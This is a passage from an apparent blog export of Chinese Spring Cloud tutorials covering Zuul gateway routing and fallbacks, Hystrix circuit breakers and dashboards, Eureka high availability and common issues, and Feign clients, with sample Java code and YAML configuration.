cause)方法，使用该方法，可获得造成回退的原因123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051@Componentpublic class MyFallbackProvider implements FallbackProvider &#123; @Override public String getRoute() &#123; // 表明是为哪个微服务提供回退，*表示为所有微服务提供回退 return &quot;*&quot;; &#125; @Override public ClientHttpResponse fallbackResponse(Throwable cause) &#123; if (cause instanceof HystrixTimeoutException) &#123; return response(HttpStatus.GATEWAY_TIMEOUT); &#125; else &#123; return this.fallbackResponse(); &#125; &#125; @Override public ClientHttpResponse fallbackResponse() &#123; return this.response(HttpStatus.INTERNAL_SERVER_ERROR); &#125; private ClientHttpResponse response(final HttpStatus status) &#123; return new ClientHttpResponse() &#123; @Override public HttpStatus getStatusCode() throws IOException &#123; return status; &#125; @Override public int getRawStatusCode() throws IOException &#123; return status.value(); &#125; @Override public String getStatusText() throws IOException &#123; return status.getReasonPhrase(); &#125; @Override public void close() &#123; &#125; @Override public InputStream getBody() throws IOException &#123; return new ByteArrayInputStream(&quot;服务不可用，请稍后再试。&quot;.getBytes()); &#125; @Override public HttpHeaders getHeaders() &#123; // headers设定 HttpHeaders headers = new HttpHeaders(); MediaType mt = new MediaType(&quot;application&quot;, &quot;json&quot;, Charset.forName(&quot;UTF-8&quot;)); headers.setContentType(mt); return headers; &#125; &#125;; &#125;&#125; 完整的Github代码地址]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （八）、Zuul 服务网关]]></title>
    <url>%2Fblog%2F2018%2F05%2F26%2FSpringCloud%20%EF%BC%88%E5%85%AB%EF%BC%89%E3%80%81Zuul%20%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%2F</url>
    <content type="text"><![CDATA[举个栗子，在一个大型的购物网站中，以微服务架构进行拆分，会分为很多种服务，比如购物车、订单服务、评论服务、库存服务、用户服务等等，服务相互之间调用，那么就会产生很多个链接地址，如果有成百上千个服务之间进行调用，那么维护起来是很麻烦的，所以根据环境需要就产生了服务网关。什么是服务网关，简单的说它就是一个中转站或者叫转发器，我们每次请求只需要去网关即可，而不需要去具体的服务请求，为了方便理解，看下面两张图下面是加了网关API之后 API 网关负责服务请求路由、组合及协议转换。客户端的所有请求都首先经过 API 网关，然后由它将请求路由到合适的微服务。API 网关经常会通过调用多个微服务并合并结果来处理一个请求。它可以在 web 协议（如 HTTP 与 WebSocket）与内部使用的非 web 友好协议之间转换。 API 网关还能为每个客户端提供一个定制的 API。通常，它会向移动客户端暴露一个粗粒度的 API。以产品详情的场景为例，API 网关可以提供一个端点（/productdetails?productid=xxx），使移动客户端可以通过一个请求获取所有的产品详情。API 网关通过调用各个服务（产品信息、推荐、评论等等）并合并结果来处理请求。 Netflix API 网关是一个很好的 API 网关实例。Netflix 流媒体服务提供给成百上千种类型的设备使用，包括电视、机顶盒、智能手机、游戏系统、平板电脑等等。 最初，Netflix 试图为他们的流媒体服务提供一个通用的 API。然而他们发现，由于各种各样的设备都有自己独特的需求，这种方式并不能很好地工作。如今，他们使用一个 API 网关，通过运行与针对特定设备的适配器代码，来为每种设备提供定制的 API。通常，一个适配器通过调用平均 6 到 7 个后端服务来处理每个请求。Netflix API 网关每天处理数十亿请求。 API 网关的优点和缺点如你所料，使用 API 网关有优点也有不足。使用 API 网关的最大优点是，它封装了应用程序的内部结构。客户端只需要同网关交互，而不必调用特定的服务。API 网关为每一类客户端提供了特定的 API，这减少了客户端与应用程序间的交互次数，还简化了客户端代码。 API 网关也有一些不足。它增加了一个我们必须开发、部署和维护的高可用组件。还有一个风险是，API 网关变成了开发瓶颈。为了暴露每个微服务的端点，开发人员必须更新 API 网关。API网关的更新过程要尽可能地简单，这很重要；否则，为了更新网关，开发人员将不得不排队等待。不过，虽然有这些不足，但对于大多数现实世界的应用程序而言，使用 API 网关是合理的。 说了那么多来看代码实现吧 代码实现老思路… 一、添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-zuul&lt;/artifactId&gt;&lt;/dependency&gt; 二、添加注解在启动类添加@EnableZuulProxy注解123456789@SpringBootApplication@EnableZuulProxypublic class SpringcloudZuulApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringcloudZuulApplication.class, args); &#125; &#125; 三、配置文件application.yml下面配置文件中，有12个例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150server: port: 8980eureka: client: service-url: defaultZone: http://rstyro:rstyropwd@localhost:8761/eurekaspring: application: name: springcloud-gateway-zuul profiles: active: zuul_demo1# 例子1，zuul 默认是对所有 eureka 服务 进行反向代理--- spring: profiles: zuul_demo1# 例子2，配置服务别名--- spring: profiles: zuul_demo2# routes 下的就是配置别名，：格式： 服务名称(service ID): /别名/**,不配的话用默认的服务名称zuul: routes: producer: /pro/** customer-ribbon: /customer/** # 例子3，`ignoredServices: * `--不反向代理，*代表所有服务，只反向代理 routes 下面配置的服务，如下例子是只代理 customer-ribbon 服务---spring: profiles: zuul_demo3zuul: ignoredServices: &apos;*&apos; routes: customer-ribbon: /customer/** # 例子4: ignoredServices:不反向代理指定的服务(多个用逗号隔开)，但是如果routes 下面配置了，可以请求配置后的服务别名---spring: profiles: zuul_demo4zuul: ignoredServices: producer,customer-ribbon routes: customer-ribbon: /customer/**# 例子5,更细粒度的配置，serviceTestName 是随便取的---spring: profiles: zuul_demo5zuul: routes: serviceTestName: path: /pro-serviceid/** serviceId: producer # 例子6,可以把serviceId 换成url---spring: profiles: zuul_demo6zuul: routes: serviceTestName: path: /pro-url/** url: http://192.168.1.101:7900/ # 例子7,配置负载均衡---spring: profiles: zuul_demo7zuul: routes: serviceTestName: path: /pro/** serviceId: producerribbon: eureka: enabled: falseproducer: ribbon: listOfServers: http://192.168.1.101:7900/,http://192.168.1.101:7901# 例子8,访问的时候加前缀 /api, 比如：http://localhost:8980/api/producer/item/1---spring: profiles: zuul_demo8zuul: prefix: /api# 例子9.如下配置，如果要访问 http://localhost:7900/item/1 的服务，，应为: http://localhost:8980/item/producer/1# 全局配置---spring: profiles: zuul_demo9zuul: prefix: /item stripPrefix: falselogging: level: com.netflix: debug # 例子10# 局部配置 ---spring: profiles: zuul_demo10zuul: routes: producer: path: /item/** stripPrefix: false# prefix: /item# stripPrefix: falselogging: level: com.netflix: debug# 例子11 # Strangulation Patterns and Local Forwards,绞杀者模式与本地转发# forward: 后面接的是本地的转发地址---spring: profiles: zuul_demo11zuul: routes: producer: path: /item/** url: forward:/item customer: path: /provider/** url: http://localhost:7900/item legacy: path: /** url: http://localhost:7900logging: level: com.netflix: debug# 例子12# 上传，下面是配置超时时间，通过zuul 代理请求时在服务地址前缀加/zuul ,即可跳过spring 限制上传的大小。比如下面的地址# http://192.168.1.101:8980/zuul/file-upload/upload# 正常是这样子的:http://192.168.1.101:8980/file-upload/upload---spring: profiles: zuul_demo12 hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds: 600000ribbon: ConnectTimeout: 5000 ReadTimeout: 600000 完整的Github代码地址 访问producer服务的接口/producer/vipAddress 请求地址为 http://192.168.1.101:8980/producer/vipAddress，也可以这样http://192.168.1.101:8980/zuul/producer/vipAddress 前缀加上/zuul 这个可以绕过Spring 的DispatcherServlet，比如上传文件时，绕过文件上传的大小限制。看文档 我们可以测试下 上传的代码如下： 上传成功后返回成功后的文件路径 上传项目1、代码片段 12345678910111213 @RestControllerpublic class UploadController &#123; @PostMapping(&quot;/upload&quot;) public Object uploadFile(@RequestParam(value=&quot;file&quot;,required=true)MultipartFile file) throws IOException &#123; if (file.isEmpty()) &#123; return null; &#125; String filePath = &quot;E:\\&quot;+System.currentTimeMillis()+&quot;_&quot;+file.getOriginalFilename(); file.transferTo(new File(filePath)); return filePath; &#125;&#125; 2、配置文件1234567891011121314server: port: 8600eureka: client: service-url: defaultZone: http://rstyro:rstyropwd@localhost:8761/eurekaspring: application: name: file-upload http: multipart: max-file-size: 2000MB #默认1M max-request-size: 2000MB #默认10m 完整的上传 Github代码地址3、测试Eureka 服务注册情况，下面的红字，代表eureka进入了 自我保护模式准备工作需要curl 工具，window 可在https://curl.haxx.se/download.html进行下载启动zuul ,使用如上的项目，配置选择 zuul_demo12 的 profiles 通过zuul 访问 上传路径为：http://localhost:8980/file-upload/upload先上传一个小文件doc.sql 发现是可以成功的，但是上传一个大文件a11.wnv 报了because its size (551282098) exceeds the configured maximum (10485760) 的错误，意思是超过文件上传的大小限制 10485760 b ，后面我们在上传的地址前加了 /zuul 发现上传成功了。测试过程如下图：]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （七）、禁用Feign对Hystrix支持与Hystrix 监控]]></title>
    <url>%2Fblog%2F2018%2F05%2F26%2FSpringCloud%20%EF%BC%88%E4%B8%83%EF%BC%89%E3%80%81%E7%A6%81%E7%94%A8Feign%E5%AF%B9Hystrix%E6%94%AF%E6%8C%81%E4%B8%8EHystrix%20%E7%9B%91%E6%8E%A7%2F</url>
    <content type="text"><![CDATA[禁用单个Feign对Hystrix支持与Hystrix 监控一、配置禁用Feign对Hystrix 的支持如果现在有两个Feign服务接口，FeignClientService1、FeignClientService2。我们现在想禁用FeignClientService2 的Hystrix支持，而FeignClientService1不变还是启用 1、配置FeignClent这个和启动Hystrix 的配置差不多，主要看的是configuration 后面这个类的内容123456789101112131415@FeignClient(name=&quot;test&quot;,url=&quot;http://localhost:7901/&quot;,configuration=FeignConfig2.class,fallback=MyHystrixFallback2.class)public interface FeignClientService2 &#123; @RequestMapping(value=&quot;/&#123;serviceName&#125;&quot;,method=RequestMethod.GET) public Object serverInfo(@PathVariable(&quot;serviceName&quot;) String serviceName); &#125;``` ### 2、自定义配置类FeignConfig2**因为feign的默认builder 是`HystrixFeign.Builder` 如下图** ![](/SpringCloud （七）、禁用Feign对Hystrix支持与Hystrix 监控/36174.png)**所以主要是重写 feignBuilder 这个方法，返回一个另一个builder即可，可查看官方文档的示例**![](/SpringCloud （七）、禁用Feign对Hystrix支持与Hystrix 监控/43178.png) @Configurationpublic class FeignConfig2 { @Bean @Scope(&quot;prototype&quot;) public Feign.Builder feignBuilder() { return Feign.builder(); } }12345678910111213 #### 重要的配置就是第二步，这样即可禁用Hystrix 的支持。** 可以访问`/hystrix.stream` 链接，查看hystrix的动向数据**![](/SpringCloud （七）、禁用Feign对Hystrix支持与Hystrix 监控/51493.png) ##### 完整的[Github代码示例](https://github.com/rstyro/SpringCloud/tree/master/SpringCloud-customer-feign-hystrix-disable-single) ## 二、Hystrix监控面板Dashboard **创建一个Dashboard项目很简单** ### 1、添加依赖 org.springframework.cloud spring-cloud-starter-hystrix-dashboard 123 ### 2、添加注解 **在启动类添加`@EnableHystrixDashboard`注解** @EnableHystrixDashboard@SpringBootApplicationpublic class HystrixDashboardApplication { public static void main( String[] args ){ SpringApplication.run(HystrixDashboardApplication.class, args); } } 123 ### 3、配置配置文件application.yml **下面是修改服务启动的端口，默认是8080，不改也是可以的，按需** server: port: 8930 ` 4、访问 启动之后，访问http://192.168.1.101:8930/hystrix即可， 在访问页面写上，hystrix.stream 的地址即可,比如：http://192.168.1.101:8904/hystrix.stream，标题随便写一个即可 完整的Github代码示例 如果监控集群的，可以配置turbine，也不是很难，可参考官方文档http://cloud.spring.io/spring-cloud-static/Dalston.SR5/single/spring-cloud.html#_turbine]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （六）、断路器模式]]></title>
    <url>%2Fblog%2F2018%2F05%2F26%2FSpringCloud%20%EF%BC%88%E5%85%AD%EF%BC%89%E3%80%81%E6%96%AD%E8%B7%AF%E5%99%A8%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[在微服务架构中，我们将系统拆分成了一个个的服务单元，各单元间通过服务注册与订阅的方式互相依赖。由于每个单元都在不同的进程中运行，依赖通过远程调用的方式执行，这样就有可能因为网络原因或是依赖服务自身问题出现调用故障或延迟，而这些问题会直接导致调用方的对外服务也出现延迟，若此时调用方的请求不断增加，最后就会出现因等待出现故障的依赖方响应而形成任务积压，最终导致自身服务的瘫痪。这就是传说中的雪崩效应 或者叫 级联失败。 为了解决这种服务之间的级联失败，所以产生了一种模式叫做断路器模式什么是断路器断路器模式源于Martin Fowler的Circuit Breaker一文。“断路器”本身是一种开关装置，用于在电路上保护线路过载，当线路中有电器发生短路时，“断路器”能够及时的切断故障电路，防止发生过载、发热、甚至起火等严重后果。在分布式架构中，断路器模式的作用也是类似的，当某个服务单元发生故障（类似用电器发生短路）之后，通过断路器的故障监控（类似熔断保险丝），向调用方返回一个错误响应，而不是长时间的等待。这样就不会使得线程因调用故障服务被长时间占用不释放，避免了故障在分布式系统中的蔓延。 Netflix Hystrix在Spring Cloud中使用了Hystrix 来实现断路器的功能。Hystrix是Netflix开源的微服务框架套件之一，该框架目标在于通过控制那些访问远程系统、服务和第三方库的节点，从而对延迟和故障提供更强大的容错能力。Hystrix具备拥有回退机制和断路器功能的线程和信号隔离，请求缓存和请求打包，以及监控和配置等功能。 代码实现上节刚讲ribbon ,所以我们直接在ribbon 的代码基础之上添加hystrix。 一、简单的hystrix配置1、添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-hystrix&lt;/artifactId&gt;&lt;/dependency&gt; 2、添加注解在启动类添加@EnableCircuitBreaker 注解123456789101112131415@SpringBootApplication@EnableEurekaClient@EnableCircuitBreakerpublic class CustomerRibbonHystrixApplication &#123; public static void main( String[] args )&#123; SpringApplication.run(CustomerRibbonHystrixApplication.class, args); &#125; @Bean @LoadBalanced public RestTemplate restTemlate() &#123; return new RestTemplate(); &#125;&#125; 3、设置请求回调3.1 在方法上添加@HystrixCommand 注解3.2 在@HystrixCommand 注解中定义回调方法名称，并实现其方法123456789101112131415161718192021222324252627@RestControllerpublic class TestController &#123; @Autowired private RestTemplate restTemplate; @Autowired private LoadBalancerClient loadBalancerClient; @GetMapping(&quot;/provider/&#123;id&#125;&quot;) @HystrixCommand(fallbackMethod=&quot;testFallback&quot;) public Object test(@PathVariable(&quot;id&quot;) String id) &#123; ServiceInstance serverInstance = loadBalancerClient.choose(&quot;producer&quot;); System.out.println(&quot;====&quot;+serverInstance.getHost()+&quot;:&quot;+serverInstance.getPort()); return restTemplate.getForObject(&quot;http://producer/item/&quot;+id,Object.class); &#125; /** * 请求失败时，调用此返回的方法 * @param id * @return */ public Object testFallback(String id) &#123; System.out.println(&quot;这个方法里面可以写回调的逻辑，下面是回调的内容，参数和如上的方法参数一致&quot;); return &quot;请求失败时，返回的数据&quot;; &#125;&#125; 这样既可实现断路器功能，可以测试下。1、启动Eureka服务2、启动生产者服务2、启动这个hystrix 项目访问请求 /provider/{id} ,返回结果应该是正常的，然后把生产者服务停掉，再次请求看是否返回我们设置的回调内容。 Github代码示例二、hystrix 对feign 的支持1、添加依赖依赖和上面的示例一 一样1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-hystrix&lt;/artifactId&gt;&lt;/dependency&gt; 2、添加注解在启动类上添加@EnableCircuitBreaker 注解因为是feign 所以也是需要@EnableFeignClients 注解1234567891011@EnableCircuitBreaker@EnableEurekaClient@EnableFeignClients@SpringBootApplicationpublic class CustomerFeignHystrixApplication &#123; public static void main( String[] args )&#123; SpringApplication.run(CustomerFeignHystrixApplication.class, args); &#125; &#125; 3、在feign接口客户端上添加注解方法一：使用fallback 1、在feign服务接口的@FeignClient 注解添加fallback 参数，后面是一个配置类名123456@FeignClient(name=&quot;producer&quot;,fallback=MyHystrixFallback.class)public interface MyFeignClient &#123; @RequestMapping(value=&quot;/item/&#123;id&#125;&quot;,method=RequestMethod.GET) public Object detai(@PathVariable(&quot;id&quot;) String id);&#125; 2、实现fallback 配置的自定义类实现feign 服务接口，重写其所有方法的回调123456789@Componentpublic class MyHystrixFallback implements MyFeignClient&#123; @Override public Object detai(String id) &#123; return &quot;自定义Hystrix 返回数据：id=&quot;+id; &#125;&#125; 方法二：使用fallbackFactory 1、在feign服务接口的@FeignClient 注解添加fallbackFactory 参数，后面是一个配置类名123456@FeignClient(name=&quot;producer&quot;,fallbackFactory=MyHystrixFallbackFactory.class)public interface MyFeignClient2 &#123; @RequestMapping(value=&quot;/item/&#123;id&#125;&quot;,method=RequestMethod.GET) public Object search(@PathVariable(&quot;id&quot;) String id);&#125; 2、实现fallbackFactory 定义的类12345678910@Componentpublic class MyHystrixFallbackFactory implements FallbackFactory&lt;MyFeignClient2&gt; &#123; private static final Logger log = LoggerFactory.getLogger(MyHystrixFallbackFactory.class); @Override public MyFeignClient2 create(Throwable e) &#123; log.info(&quot;throwable = &quot;+e); return new MyHystrixFeignClient2Fallback(); &#125;&#125; 这个MyHystrixFeignClient2Fallback 类是其实现类，fallbackFactory 可以说时fallback 的增加版1234567public class MyHystrixFeignClient2Fallback implements MyFeignClient2&#123; @Override public Object search(String id) &#123; return &quot;search 方法请求失败，id=&quot;+id; &#125;&#125; 验证过程与结果同示例一一致 Github代码示例部分参考自：http://blog.didispace.com/springcloud3/]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （五）、常见问题总结]]></title>
    <url>%2Fblog%2F2018%2F05%2F25%2FSpringCloud%20%EF%BC%88%E4%BA%94%EF%BC%89%E3%80%81%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[SpringCloud 常见问题总结1.Eureka Environment的配置：1eureka.environment: 字符串 参考文档：https://github.com/Netflix/eureka/wiki/Configuring-Eureka 2.Eureka DataCenter的配置1eureka.datacenter: cloud https://github.com/Netflix/eureka/wiki/Configuring-Eureka这边说：配置-Deureka.datacenter=cloud，这样eureka将会知道是在AWS云上 3.Eureka开启自我保护的提示1EMERGENCY! EUREKA MAY BE INCORRECTLY CLAIMING INSTANCES ARE UP WHEN THEY&apos;RE NOT. RENEWALS ARE LESSER THAN THRESHOLD AND HENCE THE INSTANCES ARE NOT BEING EXPIRED JUST TO BE SAFE. 保护模式主要用于一组客户端和Eureka Server之间存在网络分区场景下的保护。一旦进入保护模式，Eureka Server将会尝试保护其服务注册表中的信息，不再删除服务注册表中的数据（也就是不会注销任何微服务）。 详见点我 4.Eureka注册服务慢的问题如何解决？1eureka.instance.leaseRenewalIntervalInSeconds 参考文档 原文： Why is it so Slow to Register a Service?Being an instance also involves a periodic heartbeat to the registry (via the client’s serviceUrl) with default duration 30 seconds. A service is not available for discovery by clients until the instance, the server and the client all have the same metadata in their local cache (so it could take 3 heartbeats). You can change the period using eureka.instance.leaseRenewalIntervalInSeconds and this will speed up the process of getting clients connected to other services. In production it’s probably better to stick with the default because there are some computations internally in the server that make assumptions about the lease renewal period. 翻译： 作为实例还涉及到与注册中心的周期性心跳，默认持续时间为30秒（通过serviceUrl）。在实例、服务器、客户端都在本地缓存中具有相同的元数据之前，服务不可用于客户端发现（所以可能需要3次心跳）。你可以使用eureka.instance.leaseRenewalIntervalInSeconds 配置，这将加快客户端连接到其他服务的过程。在生产中，最好坚持使用默认值，因为在服务器内部有一些计算，他们对续约做出假设。 5.如何解决Eureka Server不踢出已关停的节点的问题？server端:12eureka.server.enable-self-preservation （设为false，关闭自我保护主要）eureka.server.eviction-interval-timer-in-ms 清理间隔（单位毫秒，默认是60*1000） client端：123eureka.client.healthcheck.enabled = true 开启健康检查（需要spring-boot-starter-actuator依赖）eureka.instance.lease-renewal-interval-in-seconds =10 租期更新时间间隔（默认30秒）eureka.instance.lease-expiration-duration-in-seconds =30 租期到期时间（默认90秒） 示例：服务器端配置：1234eureka: server: enableSelfPreservation: false evictionIntervalTimerInMs: 4000 客户端配置：1234eureka: instance: leaseRenewalIntervalInSeconds: 10 leaseExpirationDurationInSeconds: 30 注意：更改Eureka更新频率将打破服务器的自我保护功能，生产环境下不建议自定义这些配置。详见 6.Eureka配置instanceId显示IP在Spring Cloud中，服务的Instance ID的默认值是${spring.cloud.client.hostname}:${spring.application.name}:${spring.application.instance_id:${server.port}} ，也就是机器主机ip:应用名称:应用端口 。因此在Eureka ,如果想要自定义这部分的信息怎么办？1234567eureka: client: serviceUrl: defaultZone: http://localhost:8761/eureka/ instance: preferIpAddress: true instance-id: $&#123;spring.cloud.client.ipAddress&#125;:$&#123;server.port&#125; 7.Eureka配置最佳实践总结https://github.com/spring-cloud/spring-cloud-netflix/issues/203 注意点：eureka.client.healthcheck.enabled=true配置项必须设置在application.yml中eureka.client.healthcheck.enabled=true 只应该在application.yml中设置。如果设置在bootstrap.yml中将会导致一些不良的副作用，例如在Eureka中注册的应用名称是UNKNOWN等。 8.Ribbon 1.自定义配置时，@Configuration和@ComponentScan包不应重叠 2.使用RestTemplate时，想要获得一个List时，应该用数组，而不应该直接用List 9.Feign1.自定义配置时，@Configuration和@ComponentScan包不应重叠2.@FeignClient所在的接口中，不支持@GetMapping等组合注解3.使用@PathVariable时，需要指定其value4.Feign暂不支持复杂对象作为一个参数 转载自：周立博客]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （四）、Eureka高可用]]></title>
    <url>%2Fblog%2F2018%2F05%2F25%2FSpringCloud%20%EF%BC%88%E5%9B%9B%EF%BC%89%E3%80%81Eureka%E9%AB%98%E5%8F%AF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Eureka 高可用前面讲的例子，都离不开Eureka服务，如果说eureka 突然宕机了，那是不是所有的服务都没法用了。所以我们怎么也得弄几台才行啊我们看看官方文档的例子： 文档地址 自己动手来吧 一、导入依赖123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 二、添加注解给启动类添加@EnableEurekaServer注解123456789@SpringBootApplication@EnableEurekaServerpublic class SpringcloudEurekaPeerApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(SpringcloudEurekaPeerApplication.class, args); &#125; &#125; 三、修改配置文件application.yml这里我配置了3个节点123456789101112131415161718192021222324252627282930313233343536373839spring: application: name: Eureka-peer profiles: active: peer1---server: port: 8761spring: profiles: peer1eureka: instance: hostname: peer1 client: serviceUrl: defaultZone: http://peer2:8762/eureka/,http://peer3:8763/eureka/---server: port: 8762spring: profiles: peer2eureka: instance: hostname: peer2 client: serviceUrl: defaultZone: http://peer1:8761/eureka/,http://peer3:8763/eureka/---server: port: 8763spring: profiles: peer3eureka: instance: hostname: peer3 client: serviceUrl: defaultZone: http://peer2:8762/eureka/,http://peer1:8761/eureka/ 四、修改host文件添加如下内容1127.0.0.1 peer1 peer2 peer3 如果这个不配的话，它们3个是ping不通的 启动3个不同的profiles，然后访问：http://peer1:8761/、http://peer2:8762/、http://peer3:8763/结果几乎差不多，说明我们已经配置成功了，如果我们再启动一个生产者，生产者的eureka地址只需要写其中3个的一个，访问这3个节点，他们的注册列表都会有这个服务 Github 代码示例]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （三）、Feign使用示例]]></title>
    <url>%2Fblog%2F2018%2F05%2F25%2FSpringCloud%20%EF%BC%88%E4%B8%89%EF%BC%89%E3%80%81Feign%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[FeignFeign是一个声明式的Web Service客户端，它使得编写Web Serivce客户端变得更加简单。我们只需要使用Feign来创建一个接口并用注解来配置它既可完成。它具备可插拔的注解支持，包括Feign注解和JAX-RS注解。Feign也支持可插拔的编码器和解码器。Spring Cloud为Feign增加了对Spring MVC注解的支持，还整合了Ribbon和Eureka来提供均衡负载的HTTP客户端实现。 Spring Cloud Netflix 的微服务都是以 HTTP 接口的形式暴露的，所以可以用 Apache 的 HttpClient 或 Spring 的 RestTemplate 去调用，而 Feign 是一个使用起来更加方便的 HTTP 客戶端，使用起来就像是调用自身工程的方法，而感觉不到是调用远程方法 代码实现结尾有Github地址的代码示例 一、使用SpringMVC注解1、添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-feign&lt;/artifactId&gt;&lt;/dependency&gt; 2、加注解在启动类上加注解@EnableFeignClients12345678910@SpringBootApplication@EnableEurekaClient@EnableFeignClientspublic class CustomerFeignApplication &#123; public static void main( String[] args )&#123; SpringApplication.run(CustomerFeignApplication.class, args); &#125; &#125; 3、创建服务接口类定义一个 producer 服务的接口类12345678910@FeignClient(name=&quot;producer&quot;)public interface FeignClientService &#123; @RequestMapping(value=&quot;/item/&#123;id&#125;&quot;,method=RequestMethod.GET) public Object detai(@PathVariable(&quot;id&quot;) String id); @RequestMapping(value=&quot;/add&quot;,method=RequestMethod.POST) public Object add(Item item);&#125; 4、控制层调用12345678910111213141516@RestControllerpublic class TestController &#123; @Autowired private FeignClientService feignClientService; @GetMapping(&quot;/provider/&#123;id&#125;&quot;) public Object test(@PathVariable String id) &#123; return feignClientService.detai(id); &#125; @GetMapping(&quot;/add&quot;) public Object test(Item item) &#123; return feignClientService.add(item); &#125;&#125; 5、配置文件其实配置文件application.yml没什么特殊的123456789101112server: port: 8903 eureka: client: serviceUrl: defaultZone: http://rstyro:rstyropwd@localhost:8761/eureka instance: prefer-ip-address: truespring: application: name: customer-feign 启动eureka 和两个生产者与feign,查看结果，还是实现了负载均衡 上面我们用的是SpringMVC 的注解,下面我们用feign 默认的注解，查看Github的地址 里面介绍了基本用法 二、使用默认的注解1、自定义一个配置类FeignConfig123456789101112131415161718192021222324@Configurationpublic class FeignConfig &#123; /** * 使用它的默认配置 * * @return */ @Bean public Contract feignContract() &#123; return new feign.Contract.Default(); &#125; /** * 加日志的 * http://cloud.spring.io/spring-cloud-static/Dalston.SR5/single/spring-cloud.html#_feign_logging * @return */ @Bean Logger.Level feignLoggerLevel() &#123; return Logger.Level.FULL; &#125;&#125; 2、自定义一个服务接口类FeignClientService1234567891011@FeignClient(name=&quot;producer&quot;,configuration=FeignConfig.class)public interface FeignClientService &#123; //https://github.com/OpenFeign/feign 有例子 @RequestLine(&quot;GET /item/&#123;id&#125;&quot;) public Object detai(@Param(&quot;id&quot;) String id); @RequestLine(&quot;POST /add&quot;) public Object add(Item item);&#125; 3、调用123456789101112131415161718@RestControllerpublic class TestController &#123; @Autowired private FeignClientService feignClientService; @GetMapping(&quot;/provider/&#123;id&#125;&quot;) public Object test(@PathVariable String id) &#123; return feignClientService.detai(id); &#125; @GetMapping(&quot;/add&quot;) public Object test(Item item) &#123; return feignClientService.add(item); &#125; &#125; 4、配置文件如果机子的性能比较差什么的，第一次请求会报一个请求超时异常，解决方案看下面配置文件123456789101112131415161718192021222324server: port: 8904 eureka: client: serviceUrl: defaultZone: http://rstyro:rstyropwd@localhost:8761/eureka instance: prefer-ip-address: truespring: application: name: customer-feign-default logging: level: top.lrshuai.cloud.springcloud.feign.FeignClientService: DEBUG # 解决第一次请求报超时异常的方案：hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds: 5000# 或者：# hystrix.command.default.execution.timeout.enabled: false# 或者：# feign.hystrix.enabled: false ## 索性禁用feign的hystrix 超时的issue：https://github.com/spring-cloud/spring-cloud-netflix/issues/768超时的解决方案： http://stackoverflow.com/questions/27375557/hystrix-command-fails-with-timed-out-and-no-fallback-availablehystrix配置： https://github.com/Netflix/Hystrix/wiki/Configuration#execution.isolation.thread.timeoutInMilliseconds上面的Github代码地址：demo1、demo2]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud （二）、Ribbon客户端负载均衡]]></title>
    <url>%2Fblog%2F2018%2F05%2F25%2FSpringCloud%20%EF%BC%88%E4%BA%8C%EF%BC%89%E3%80%81Ribbon%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%2F</url>
